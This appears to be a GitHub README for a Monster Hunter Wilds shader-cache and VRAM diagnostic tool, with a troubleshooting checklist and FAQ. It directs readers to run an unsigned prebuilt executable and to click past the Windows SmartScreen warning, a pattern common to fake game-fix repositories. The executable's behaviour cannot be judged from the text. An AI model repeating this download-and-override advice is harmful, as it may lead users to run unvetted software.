<p align="center">
  <img src="https://i.postimg.cc/QCJ911Vq/banner.png" alt="MH Wilds Shader & Frame Doctor — RE Engine shader.cache2 & VRAM Diagnostics for Windows" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-RE%20Engine%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-mhwilds--frame--check--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# MH Wilds Shader & Frame Doctor — RE Engine shader.cache2 & VRAM Diagnostics for Windows

**Monster Hunter Wilds stuttering sharply whenever you rotate the camera? Game closing with the RE Engine CrashReport dialog after a title update? Check shader.cache2, config.ini, and GPU VRAM headroom before reinstalling the game.**

MH Wilds Shader & Frame Doctor focuses on Capcom's RE Engine behavior on Windows PC: **stale `shader.cache2` files after title updates**, physical GPU VRAM saturation from high-resolution textures, and leftover root-folder DLL hooks (`dinput8.dll`) that conflict with patched game executables.

This project is aimed at **Monster Hunter Wilds on Windows (Steam)**. It concerns `shader.cache2` status, `config.ini` backups, and RE Engine crash diagnostics—not anti-tamper bypasses or save editing.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Severe stutter right after a title update | Stale `shader.cache2` file in `MonsterHunterWilds\` root | Back up and rebuild `shader.cache2` after major Capcom patches |
| Frame drops when turning camera in camps | High-Res Texture Pack exceeding 8 GB–12 GB physical VRAM | Audit dedicated GPU VRAM and lower Texture Quality one step |
| RE Engine `CrashReport` popup on boot | Outdated root-folder `dinput8.dll` (REFramework) after a patch | Move `dinput8.dll` out of `MonsterHunterWilds\` and test clean launch |
| Unstable frame pacing with Frame Generation | Multiple capture overlays (`RTSS`, `Discord`) hooking RE Engine | Disable background overlays during Frame Generation sessions |

## Download for Windows

[**Download MHWildsFrameCheck.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/MHWildsFrameCheck.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `MHWildsFrameCheck.exe`? (Automatic checks in ~2 seconds)

- Locates `MonsterHunterWilds` across Steam libraries and inspects `shader.cache2` size and timestamp.
- Checks `config.ini` presence and detects root-folder DLL hooks (`dinput8.dll`) that break after patches.
- Scans the `crashreport\` directory for recent RE Engine crash dumps.
- Reports GPU model, driver version, and dedicated VRAM headroom.

### Sample Diagnostic Output

```text
[MHWildsFrameCheck] Inspecting Monster Hunter Wilds RE Engine files...
[OK]   Game Install     : D:\SteamLibrary\steamapps\common\MonsterHunterWilds
[OK]   config.ini       : Found (4.6 KB)
[OK]   shader.cache2    : Found (1.42 GB, Modified: 2026-11-15 18:10)
[WARN] Root Hook DLL    : dinput8.dll detected (verify compatibility with latest patch)
[INFO] crashreport\     : 0 recent dumps
```

The release ZIP is named `MHWildsFrameCheck.zip`; the Windows executable inside is named `MHWildsFrameCheck.exe`.

1. Close Monster Hunter Wilds before moving or checking game files.
2. Click **Download MHWildsFrameCheck.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `MHWildsFrameCheck.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Monster Hunter Wilds and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit), a Windows Steam installation of Monster Hunter Wilds, and sufficient disk space for shader compilation.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `MHWildsFrameCheck.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### Severe stutter immediately after a Capcom title update

Monster Hunter Wilds stores compiled shaders in `shader.cache2` in the root installation folder. When a patch updates shaders without invalidating `shader.cache2`, severe micro-stutter occurs until the cache is cleanly rebuilt.

### Frame drops when rotating the camera in camps or locales

High-Resolution Texture Packs and Ultra shadow settings can exceed 8 GB–12 GB VRAM buffers, forcing Windows to page textures over PCIe system memory during rapid camera pans.

### RE Engine CrashReport popup on startup after patching

Root-folder hooks such as `dinput8.dll` (REFramework) compiled for an earlier build often trigger immediate startup crashes after an official update.

### Unstable frame pacing with Frame Generation enabled

Background capture overlays (Discord, GeForce Experience, RTSS) can conflict with RE Engine Frame Generation pacing if multiple hooks attach simultaneously.

## Where Monster Hunter Wilds files normally belong

On a standard Windows Steam setup, `shader.cache2`, `config.ini`, and `crashreport` sit directly inside the game directory:

```text
%ProgramFiles(x86)%\Steam\steamapps\common\MonsterHunterWilds\
```

Inside that structure, key files and subdirectories typically look like this:

```text
MonsterHunterWilds\
├── MonsterHunterWilds.exe
├── config.ini
├── shader.cache2
└── crashreport\
```

If you use REFramework or native DLL mods, `dinput8.dll` and a `reframework\` folder will also appear in this root directory.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Exit Monster Hunter Wilds completely.** Ensure `MonsterHunterWilds.exe` and any `CrashReport.exe` processes have closed.
2. **Back up `config.ini` before testing changes.** Copy `config.ini` to a dated folder in Documents so you can restore your baseline graphics configuration.
3. **Inspect `shader.cache2` timestamp and size.** Compare the modified date of `shader.cache2` against your last game patch date.
4. **Check for root-folder DLL mods after updates.** Temporarily move `dinput8.dll` out of `MonsterHunterWilds\` to verify whether an outdated hook caused a startup crash.
5. **Check dedicated GPU VRAM vs. texture quality.** Lower Texture Quality one step if camera-turn hitches persist on 8 GB or 10 GB graphics cards.
6. **Verify installed game files in Steam.** Run **Steam → Properties → Installed Files → Verify integrity of game files**.
7. **Restart the game and allow initial shader compilation to finish.** Let the main-menu shader compilation bar complete uninterrupted before loading a hunt.

### Before moving any files

Keep a backup copy of `config.ini` and any custom REFramework scripts before removing root-folder files or rebuilding `shader.cache2`.

## What an effective diagnostic report should tell you

An effective diagnostic check verifies **`shader.cache2` file size and timestamp**, checks `config.ini` presence, detects root-folder DLL hooks or `crashreport` dumps, and compares system RAM/VRAM against recommended thresholds.

## FAQ

**Where is shader.cache2 located in Monster Hunter Wilds?**

It is located in the root installation directory (`steamapps\common\MonsterHunterWilds\shader.cache2`).

**Is it safe to rebuild shader.cache2?**

Yes—if `shader.cache2` is corrupted after a patch, backing it up and removing it forces the game to recompile fresh shaders on next launch.

**Why does Monster Hunter Wilds crash after a new patch?**

Most post-patch startup crashes happen when an older `dinput8.dll` mod loader is still present in the game folder.

**Where is config.ini stored?**

Directly inside `steamapps\common\MonsterHunterWilds\config.ini`.

**Can this tool unlock DLC or edit hunter rank?**

No. It is strictly a local file and performance diagnostic reference.

**Are any Capcom binaries or mods distributed here?**

No game binaries, save files, or third-party mods are included in this repository.

## Useful reading

- [Monster Hunter Wilds on Steam](https://store.steampowered.com/app/2246340/Monster_Hunter_Wilds/)
- [Official Monster Hunter Wilds Website](https://www.monsterhunter.com/wilds/)

## More Windows Game Diagnostic Tools

- [Stalker2-ShaderCacheGuard](../Stalker2-ShaderCacheGuard) — S.T.A.L.K.E.R. 2 UE5 shader compilation & `C:` space check
- [CrimsonDesert-ShaderFrameDoctor](../CrimsonDesert-ShaderFrameDoctor) — Crimson Desert DX12 shader cache & save diagnostics
- [PBZ-UE4SSLoaderCheck](../PBZ-UE4SSLoaderCheck) — Phantom Blade Zero `UE4SS.log` AOB & `~mods` loader check
- [CP2077-RedModLogInspector](../CP2077-RedModLogInspector) — Cyberpunk 2077 `RED4ext`, CET & `redscript` log inspector

*Independent community project. Not affiliated with CAPCOM Co., Ltd., Valve, or Steam. All trademarks belong to their respective owners.*
 
 
 
 
 
